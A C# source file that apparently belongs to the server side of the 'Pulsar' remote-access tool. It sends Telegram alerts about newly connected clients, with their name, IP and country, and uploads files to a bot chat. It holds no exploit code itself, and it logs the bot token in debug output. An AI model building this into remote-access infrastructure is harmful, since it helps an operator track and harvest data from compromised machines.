using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace Pulsar.Server.TelegramSender
{
    public class TelegramService
    {
        private readonly string _botToken;
        private readonly long _chatId;

        public bool IsConfigured => !string.IsNullOrEmpty(_botToken) && _chatId != 0;

        public TelegramService(string botToken, long chatId)
        {
            _botToken = botToken;
            _chatId = chatId;
        }

        public async Task<string> SendConnectionMessage(string clientName, string ipAddress, string country)
        {
            if (!IsConfigured) return null;

            try
            {
                string message = $"✨ *New Client Connected!* ✨\n" +
                               $"👤 Name: {clientName}\n" +
                               $"🌐 IP: {ipAddress}\n" +
                               $"🌎 Country: {country}";

                return await SendMessageAsync(message);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to send Telegram connection message: {ex.Message}");
                throw;
            }
        }

        public async Task<string> SendMessageAsync(string message)
        {
            if (!IsConfigured) return null;

            try
            {
                string url = $"https://api.telegram.org/bot{_botToken}/sendMessage?chat_id={_chatId}&text={Uri.EscapeDataString(message)}&parse_mode=Markdown";
                Debug.WriteLine($"Telegram Request URL: {url}");

                WebRequest request = WebRequest.Create(url);
                request.Method = "GET";
                request.Timeout = 10000;

                using (WebResponse response = await request.GetResponseAsync())
                {
                    HttpWebResponse httpResponse = (HttpWebResponse)response;
                    if (httpResponse.StatusCode != HttpStatusCode.OK)
                    {
                        throw new Exception($"Telegram API returned status: {httpResponse.StatusCode}");
                    }

                    using (Stream stream = response.GetResponseStream())
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        string responseText = await reader.ReadToEndAsync();
                        Debug.WriteLine($"Telegram Response: {responseText}");
                        return responseText;
                    }
                }
            }
            catch (WebException ex)
            {
                if (ex.Response != null)
                {
                    using (HttpWebResponse errorResponse = (HttpWebResponse)ex.Response)
                    using (Stream stream = errorResponse.GetResponseStream())
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        string errorText = await reader.ReadToEndAsync();
                        Debug.WriteLine($"Telegram Error Response: {errorText}");
                        throw new Exception($"Telegram API error: {errorResponse.StatusCode} - {errorText}");
                    }
                }
                throw new Exception($"Network error: {ex.Message}");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to send Telegram message: {ex.Message}");
                throw;
            }
        }

        public async Task<string> SendFileAsync(string filePath, string caption = null)
        {
            if (!IsConfigured) return null;

            try
            {
                if (!File.Exists(filePath))
                    throw new FileNotFoundException($"File not found: {filePath}");

                using (var client = new HttpClient())
                using (var form = new MultipartFormDataContent())
                {
                    form.Add(new StringContent(_chatId.ToString()), "chat_id");
                    
                    if (!string.IsNullOrEmpty(caption))
                        form.Add(new StringContent(caption), "caption");

                    using (var fileStream = File.OpenRead(filePath))
                    {
                        form.Add(new StreamContent(fileStream), "document", Path.GetFileName(filePath));

                        string url = $"https://api.telegram.org/bot{_botToken}/sendDocument";
                        Debug.WriteLine($"Telegram File Upload: {url}");

                        var response = await client.PostAsync(url, form);
                        response.EnsureSuccessStatusCode();

                        string responseContent = await response.Content.ReadAsStringAsync();
                        Debug.WriteLine($"Telegram File Upload Response: {responseContent}");
                        return responseContent;
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to send Telegram file: {ex.Message}");
                throw;
            }
        }

        // Backward compatibility with old static method
        public static async Task<string> SendConnectionMessage(string botToken, string chatId, string clientName, string ipAddress, string country)
        {
            try
            {
                string message = $"✨ *New Client Connected!* ✨\n" +
                               $"👤 Name: {clientName}\n" +
                               $"🌐 IP: {ipAddress}\n" +
                               $"🌎 Country: {country}";

                string url = $"https://api.telegram.org/bot{botToken}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(message)}";
                Debug.WriteLine($"Request URL: {url}");

                WebRequest request = WebRequest.Create(url);
                request.Method = "GET";
                request.Timeout = 10000;

                using (WebResponse response = await request.GetResponseAsync())
                {
                    HttpWebResponse httpResponse = (HttpWebResponse)response;
                    if (httpResponse.StatusCode != HttpStatusCode.OK)
                    {
                        throw new Exception($"Telegram API returned status: {httpResponse.StatusCode}");
                    }

                    using (Stream stream = response.GetResponseStream())
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        string responseText = await reader.ReadToEndAsync();
                        Debug.WriteLine($"Response: {responseText}");
                        return responseText;
                    }
                }
            }
            catch (WebException ex)
            {
                if (ex.Response != null)
                {
                    using (HttpWebResponse errorResponse = (HttpWebResponse)ex.Response)
                    using (Stream stream = errorResponse.GetResponseStream())
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        string errorText = await reader.ReadToEndAsync();
                        Debug.WriteLine($"Error Response: {errorText}");
                        throw new Exception($"Telegram API error: {errorResponse.StatusCode} - {errorText}");
                    }
                }
                throw new Exception($"Network error: {ex.Message}");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to send Telegram message: {ex.Message}");
                throw;
            }
        }
    }
}
